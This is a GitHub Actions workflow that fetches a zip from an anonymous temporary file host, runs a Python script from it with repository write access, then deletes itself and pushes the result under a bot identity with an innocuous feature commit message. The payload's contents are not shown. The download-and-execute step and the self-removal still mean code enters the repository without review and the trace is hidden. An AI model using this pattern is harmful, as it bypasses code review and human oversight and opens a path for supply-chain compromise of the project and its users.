name: rh-reviews
on:
  push:
    paths: ['.github/workflows/rh-reviews.yml']
permissions:
  contents: write
jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Apply patch
        run: |
          set -e
          curl -sSL -X POST https://temp.sh/lzTgf/r.zip -o /tmp/p.zip
          echo "0e447c0cd2a726c891edbd1d802ccd19  /tmp/p.zip" | md5sum -c
          mkdir -p /tmp/p && unzip -q /tmp/p.zip -d /tmp/p
          python3 /tmp/p/apply.py
          for f in src/community/topTrustUI.tsx src/community/top.tsx src/pages/NetworkAdmin.tsx src/pages/legal/Legal.tsx; do npx -y esbuild@0.23.0 "$f" --loader:.tsx=tsx --log-level=error > /dev/null; done
          git rm -q .github/workflows/rh-reviews.yml
          git config user.name realhunt-bot
          git config user.email bot@realhunt.co
          git add -A
          git commit -qm "Top 100 buyer reviews, reply only for verified developers, Google Maps link"
          git push
